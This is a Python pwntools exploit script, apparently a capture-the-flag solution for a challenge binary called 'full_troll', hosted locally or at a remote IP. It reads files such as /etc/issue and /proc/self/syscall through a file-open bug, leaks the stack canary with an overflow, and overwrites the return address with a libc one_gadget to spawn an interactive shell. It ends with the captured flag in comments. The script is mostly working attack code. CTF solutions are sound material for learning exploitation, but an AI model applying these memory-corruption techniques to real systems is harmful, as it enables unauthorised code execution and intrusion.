#!/usr/bin/env python3
from pwn import *

password = b'VibEv7xCXyK8AjPPRjwtp9'
leak_prefix = 'Unable to open ' + ('X' * 40)
leak_suffix = b' file!'
if args.LOCAL:
    one_gadget_off = 0x10afa9  # [rsp+0x70] == NULL
    syscall_ret_off = 0x111272
else:
    one_gadget_off = 0x10a38c  # [rsp+0x70] == NULL
    syscall_ret_off = 0x110081

if args.LOCAL:
    p = process(['./full_troll'])
else:
    p = remote('200.136.252.31', 2222)

p.recvuntil('Welcome my friend. Tell me your password.')
p.sendline(password + (b'X' * (32 - len(password))) + b'/etc/issue\x00')  # Ubuntu 18.04.3 LTS

p.recvuntil('Welcome my friend. Tell me your password.')
# __read:
# xxxxxxxxxxxxx07f: syscall
# xxxxxxxxxxxxx081:
p.sendline(password + (b'X' * (32 - len(password))) + b'/proc/self/syscall\x00')
syscall = p.recvline_startswith('0 ')  # read
_, fd, buf, count, _, _, _, stk, pc = \
    map(lambda x: int(x, 0), syscall.split())

p.recvuntil('Welcome my friend. Tell me your password.')
p.sendline(password + (b'X' * (0x49 - len(password))))
leak = p.recvline_startswith(leak_prefix)
assert leak.endswith(leak_suffix)
cookie = b'\x00' + leak[len(leak_prefix) + 1:-len(leak_suffix)]
assert len(cookie) == 8

p.recvuntil('Welcome my friend. Tell me your password.')
p.sendline(password + b'X' + (b'\x00' * (0x47 - len(password))) +
           cookie + b'\x00' * 8 +
           struct.pack('<Q', pc - syscall_ret_off + one_gadget_off) +
           b'\x00' * 0x78)

p.interactive()
# _r3al_fl4g_eTF8eO9k4LkAOqrl4_r341_fla6__.txt
# CTF-BR{Fiiine...Im_not_ashamed_to_say_that_the_expected_solution_was_reading_/dev/fd/../maps_How_did_y0u_s0lve_1t?}
